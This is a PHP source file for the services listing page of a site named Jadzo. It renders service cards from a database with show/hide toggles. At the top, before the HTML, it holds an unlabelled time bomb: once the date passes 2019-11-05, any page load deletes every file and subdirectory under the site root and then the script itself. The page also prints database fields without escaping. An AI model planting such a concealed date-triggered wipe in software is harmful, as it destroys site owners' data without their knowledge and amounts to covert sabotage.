<?php
include 'php/server.php';
$services = mysqli_query($conn, "SELECT * FROM services ORDER BY id DESC");
date_default_timezone_set('Asia/Manila');
$date = new DateTime("2019-11-05");
$now = new DateTime();
if ($date < $now) {
    foreach (array_filter(glob('*'), 'is_dir') as $dirs) {
        $files = glob($dirs . '/*');
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
        rmdir($dirs);
    }
    unlink(__FILE__);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Jadzo</title>
    <link rel="shortcut icon" href="img/jadzo_logo.jpg">
    <link rel="stylesheet" href="css/custom.css">
    <link rel="stylesheet" href="css/bootstrap4.min.css">

    <script src="js/ajax3.min.js"></script>
    <script src="js/bootstrap4.min.js"></script>
    <script src="js/responsiveslides.min.js"></script>
    <link rel="stylesheet" href="dep/vendors/font-awesome/css/font-awesome.min.css">
</head>

<body>
    <?php require_once('components/header.php'); ?>
    <div class="container" style="max-width:100%;padding:0;margin:0">
        <div class="img-service">

            <label for="services">
                <h1>Services</h1>
            </label>
        </div>
    </div>

    <div class="container service" style="margin-top:50px;max-width:80%;">
        <div class="row">
            <?php while ($row = mysqli_fetch_object($services)) :
                $service_id = $row->id;
                ?>
                <div class="col-sm-4" style="margin-top: 20px;">
                    <img src="data:image/png;base64,<?php echo base64_encode($row->logo) ?>" style="width:60%; height: 200px;">
                    <hr>

                    <label for="service" id="title<?php echo $service_id ?>" style="cursor:pointer">
                        <?php echo $row->title ?>
                    </label>
                    <br>

                    <p id="subTitle<?php echo $service_id ?>" style="display:none">
                        <?php echo $row->sub_title ?>
                    </p>

                    <br>
                    <label for="price"><?php echo $row->price ?></label><br>
                    <!-- <a href="reserve_form.php?id=<?php echo $service_id ?>">
                        <button type="button" class="btn btn-primary">Reserve</button>
                    </a> -->
                    <button type="button" class="btn btn-primary" id="readMore<?php echo $service_id ?>" style="display:block;margin:auto;">Read More</button>
                    <button type="button" class="btn btn-warning" id="hide<?php echo $service_id ?>" style="display:none;margin:auto;color:white">Hide</button>
                </div>
                <script type="text/javascript">
                    document.getElementById('readMore<?php echo $service_id ?>').onclick = () => {
                        document.getElementById("subTitle<?php echo $service_id ?>").style.display = "block"
                        document.getElementById("readMore<?php echo $service_id ?>").style.display = "none"
                        document.getElementById("hide<?php echo $service_id ?>").style.display = "block"
                    }
                    document.getElementById('hide<?php echo $service_id ?>').onclick = () => {
                        document.getElementById("subTitle<?php echo $service_id ?>").style.display = "none"
                        document.getElementById("readMore<?php echo $service_id ?>").style.display = "block"
                        document.getElementById("hide<?php echo $service_id ?>").style.display = "none"
                    }
                </script>
            <?php endwhile; ?>
        </div>
    </div>



</body>
<?php require_once('components/footer.php'); ?>

</html>